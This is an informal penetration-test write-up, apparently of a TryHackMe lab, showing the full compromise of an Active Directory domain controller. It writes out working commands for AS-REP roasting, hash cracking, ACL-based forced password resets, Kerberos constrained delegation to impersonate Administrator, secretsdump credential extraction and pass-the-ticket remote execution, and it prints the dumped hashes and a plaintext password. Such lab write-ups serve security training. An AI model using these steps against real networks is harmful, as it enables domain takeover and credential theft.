started  with a nmap scan of the victim

nmap -sS -sV -O 10.49.137.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-28 12:42 UTC
Nmap scan report for ip-10-49-137-6.ap-south-1.compute.internal (10.49.137.6)
Host is up (0.00049s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-28 12:42:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ip-10-49-137-92.ap-south-1.compute.internal (10.49.137.92)
Host is up (0.00031s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
6667/tcp open  irc     UnrealIRCd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/28%OT=22%CT=1%CU=32348%PV=Y%DS=1%DC=I%G=Y%TM=6ABA
OS:6136%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FF%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=2%ISR=109%TI=Z%CI=Z%
OS:TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW
OS:7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4
OS:B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel

domain name: thm.corp0
Host: HAYSTACK
Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp


Did dns eumeration, found the DC name which we already had

dig @10.49.156.141 thm.corp
Domain: thm.corp
DC: HayStack.thm.corp

Then performed SMB enumeration

smbclient -L //10.49.137.6 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

there was anonymous access to smb Data shares

found a directory named Onboarding and there were three files and their names were changing continuosly 


smbclient //10.49.137.6/Data -N
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Wed Jul 19 08:40:57 2023
  ..                                  D        0  Wed Jul 19 08:40:57 2023
  onboarding                          D        0  Mon Sep 28 13:59:34 2026

		7863807 blocks of size 4096. 3025130 blocks available
smb: \> cd onboarding\
smb: \onboarding\> ls
  .                                   D        0  Mon Sep 28 13:59:34 2026
  ..                                  D        0  Mon Sep 28 13:59:34 2026
  dakcxrop.3ln.pdf                    A  3032659  Mon Jul 17 08:12:09 2023
  e1btu2mf.wjp.txt                    A      521  Mon Aug 21 18:21:59 2023
  ufliurwy.xmg.pdf                    A  4700896  Mon Jul 17 08:11:53 2023

Enumerated files but did not find something useful except some employee name and a sample reset password
Employee: LILY ONEILL
Initial password: ResetMe123!
Also exctracted metadata using exiftool but nothing useful

After that tried RID bruteforcing for user enumeration using netexec and got list of usernames

nxc smb 10.49.156.141 -u guest -p '' --rid-brute > users1.txt

After getting the list of usernames, formatted the list such that only usernames are present

Then enumerated users for AS-REP Roasting

impacket-GetNPUsers thm.corp/ -usersfile usersv2.txt -dc-ip 10.49.156.141

Found 3 AS-REP roastable accounts (got their asrep hashes)
ERNESTO_SILVA
TABATHA_BRITT
LEANN_LONG

Put all the hashes in a file and tried cracking using hashcat

hashcat -m 18200 hashes.txt /usr/share/wordlist/rockyou.txt

Only cracked hash for one account

TABATHA_BRITT : marlboro(1985)

verified creds against smb

crackmapexec smb 10.49.156.141 -u TABATHA_BRITT -p 'marlboro(1985)' --users
crackmapexec smb 10.49.156.141 -u TABATHA_BRITT -p 'marlboro(1985)' --shares

Then ran bloodhound to get info about the ad related to acls, groups, users etc.

bloodhound-python -u 'TABATHA_BRITT' -p 'marlboro(1985)' -d 'thm.corp' -dc 'HayStack.thm.corp' -ns 10.49.156.141 -c All

Uploaded json to bloodhound and found this attack path (screenshots attached)

TABATHA_BRITT
    └── GenericAll → SHAWNA_BRAY
SHAWNA_BRAY
    └── ForceChangePassword → CRUZ_HALL
CRUZ_HALL
    ├── ForceChangePassword → DARLA_WINTERS
    ├── GenericWrite → DARLA_WINTERS
    └── Owns → DARLA_WINTERS
DARLA_WINTERS
    └── AllowedToDelegate → HAYSTACK.THM.CORP


then we forcechanged every user's password using the rights and finally reached to darla winters

samba-tool user setpassword SHAWNA_BRAY --newpassword='Password@123' -U "thm.corp\TABATHA_BRITT" -H ldap://10.49.156.141
samba-tool user setpassword CRUZ_HALL --newpassword='Password@123' -U "thm.corp\SHAWNA_BRAY" -H ldap://10.49.156.141
samba-tool user setpassword DARLA_WINTERS --newpassword='Password@123' -U "thm.corp\CRUZ_HALL" -H ldap://10.49.156.141


from darla's delegation configuration we confirmed that
trustedtoauth: True

msDS-AllowedToDelegateTo:
cifs/HayStack.thm.corp/thm.corp
cifs/HayStack.thm.corp
cifs/HAYSTACK
cifs/HayStack.thm.corp/THM
cifs/HAYSTACK/THM

servicePrincipalName:
POP3/HAYSTACK

Then performed constrained delegation 

Darla credentials
       │
       ▼
    S4U2Self
       │
       ▼
Administrator identity
       │
       ▼
    S4U2Proxy
       │
       ▼
cifs/HayStack.thm.corp

getST.py -spn 'cifs/HayStack.thm.corp' -impersonate 'Administrator' -dc-ip 10.49.156.141 'thm.corp/DARLA_WINTERS:Password@123'
The ticket was saved in .ccache (Kerberos credential cache)

(screenshot attached for output)

then we pointed KRB5CCNAME to our .ccache 
KRB5CCNAME -> environment variable used by Kerberos to locate the active credentials cache containing ticket-granting tickets (TGTs) and session keys

now since we had ticket we can now do pass-the-ticket for wmi access without using password

extracted credentials/hashes for users using pass-the-ticket
secretsdump.py thm.corp/Administrator@haystack.thm.corp -k -no-pass


Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab4f5a5c42df5a0ee337d12ce77332f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
THM\HAYSTACK$:aes256-cts-hmac-sha1-96:c9cc45eee2992bf1ee936594d8d585fcc3083d90a7703588c94ed551dd377950
THM\HAYSTACK$:aes128-cts-hmac-sha1-96:3fc8d586e85a317648ca415eebb45188
THM\HAYSTACK$:des-cbc-md5:ce7657c220798c1c
THM\HAYSTACK$:plain_password_hex:7b5be2a05fef69a9e1b6c2c8f1d12d77f8f2e6590b61e40569cb84395ceb706f7d9078a09005eb0921ad2315d6b1e89665dbf1f821618e942c90869c0ddeccff216aec525c30b92ce347f9014c081f882ee0cd88f16ac1dfa636c5f8dfe972db49bcb321509205f138a12d618f310d15ec4cf33f2177ffcb29914c6d358983ca77c3fd97e22721bc4c459f19adaf0afc6addfc425cee19ae8803f44fbdeabe42a62cec7de5aa101f396beaf8a7dba79191dde43677630bd12c3b1f8a66614a2020c5c3d164bafa414cdd0874c476539aaf489f5c38de7591f11d47b214f0a143ff41bd16d558a96a6a80a327031037de
THM\HAYSTACK$:aad3b435b51404eeaad3b435b51404ee:eeae607c3480929b28d8607263233dc3:::
[*] DefaultPassword 
THM\automate:Passw0rd!

we also tried pass-the-hash but failed as I believe it was because the hash was of HAYSTACK\Administrator as it was extarcted from local SAM which is different from THM\Administrator


wmiexec.py -k -no-pass 'thm.corp/Administrator@haystack.thm.corp'
-k -> point to the ticket in .ccache 